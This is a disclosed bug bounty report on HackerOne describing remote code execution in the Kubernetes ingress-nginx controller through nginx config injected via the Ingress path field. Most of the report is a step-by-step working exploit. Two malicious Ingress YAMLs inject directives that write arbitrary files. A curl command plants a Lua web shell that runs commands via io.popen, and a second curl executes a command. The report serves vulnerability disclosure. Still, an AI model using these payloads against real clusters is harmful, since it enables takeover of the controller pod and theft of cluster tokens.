# RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field

## Report Details
- **Report ID**: 1620702
- **URL**: https://hackerone.com/reports/1620702
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-06-30T14:34:17.996Z
- **Disclosed**: 2023-10-26T10:07:49.100Z

## Reporter
- **Username**: ginoah
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:

A user with ingress create/update privilege may inject config into `nginx.conf` with `path`.
Config the log_format and access_log to write arbitrary file.
Include the file we created to bypass `path` sanitizer to RCE.

## Kubernetes Version:

```
serverVersion:
  buildDate: "2022-03-06T21:32:53Z"
  compiler: gc
  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
  gitTreeState: clean
  gitVersion: v1.23.4
  goVersion: go1.17.7
  major: "1"
  minor: "23"
  platform: linux/amd64
```

## Component Version:

```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.2.1
  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.19.10

-------------------------------------------------------------------------------
```

## Steps To Reproduce:

  1. Create a kind cluster config

lab.yaml
```yaml
kind: Cluster
name: lab
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
# the control plane node config
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: InitConfiguration
    nodeRegistration:
      kubeletExtraArgs:
        node-labels: "ingress-ready=true"
  extraPortMappings:
  - containerPort: 80
    hostPort: 80
    protocol: TCP
  - containerPort: 443
    hostPort: 443
    protocol: TCP
# the three workers
- role: worker
- role: worker
- role: worker
```

  2. Create a testing cluster with the previous config

```bash
kind create cluster --config lab.yaml
```

  3. Install nginx-ingress-controller

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
```

  4. Create a the first malicious ingress

**This ingress will allow attacker to write arbitrary content to arbitrary file.**
(note that the service `not-exist-service` does not need to exist)

write_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                access_log /tmp/luashell exploit;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the first malicious ingress config
```bash
kubectl apply -f write_ingress.yaml
```

  5. Write a malicious lua config to `/tmp/luashell`

Note that in other cluster config, the `localhost` may need to change to ingress-controller's ip.
```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

  6. Create a the second malicious ingress

**This ingress will include the malicious lua config, which allow attack to execute arbitrary command.**

webshell_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                include /tmp/luashell;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the second malicious ingress config
```bash
kubectl apply -f webshell_ingress.yaml
```

  7. RCE and get output

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

## Supporting Material/References:

  * [attachment / reference]

{F1802462}

## Impact

A cluster user/SA with ingress create/update privilege may Remote Code Execution on `ingress-nginx-controller` pod

After RCE on ingress-nginx-controller the attacker may
- utilize the token to take further action on cluster with ingress's privilege
- eavesdrop the traffic, modify other ingress rule
- DOS
- ...

## Attachments
- Screen_Shot_2022-06-30_at_10.22.52_PM.png
